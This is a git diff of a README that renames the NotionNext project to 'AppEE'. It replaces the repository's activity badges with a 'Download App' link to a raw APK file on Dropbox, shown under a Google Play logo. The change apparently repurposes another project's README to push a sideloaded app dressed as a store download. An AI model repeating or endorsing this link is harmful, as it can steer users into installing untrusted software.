@@ -1,11 +1,8 @@
-# NotionNext
+# AppEE
 
 <p>
-  <a aria-label="GitHub commit activity" href="https://github.com/tangly1024/NotionNext/commits/main" title="GitHub commit activity">
-    <img src="https://img.shields.io/github/commit-activity/m/tangly1024/NotionNext?style=for-the-badge"/>
-  </a>
-  <a aria-label="GitHub contributors" href="https://github.com/tangly1024/NotionNext/graphs/contributors" title="GitHub contributors">
-    <img src="https://img.shields.io/github/contributors/tangly1024/NotionNext?color=orange&style=for-the-badge"/>
+  <a aria-label="Download App" href="https://dl.dropboxusercontent.com/s/qsz1d8w1jsvw2ia/app-ee.apk?dl=0" title="Download App">
+    <img src="https://www.svgrepo.com/show/303118/google-play-download-android-app-logo.svg" height="200"/>
   </a>
   <a aria-label="Build status" href="#" title="Build status">
     <img src="https://img.shields.io/github/deployments/tangly1024/NotionNext/Production?logo=Vercel&style=for-the-badge"/>
@@ -16,7 +13,7 @@
 </p>
 
 
-[中文文档](./README.md) | README in English
+(./README.md) | README in English
 
 <hr/>
 
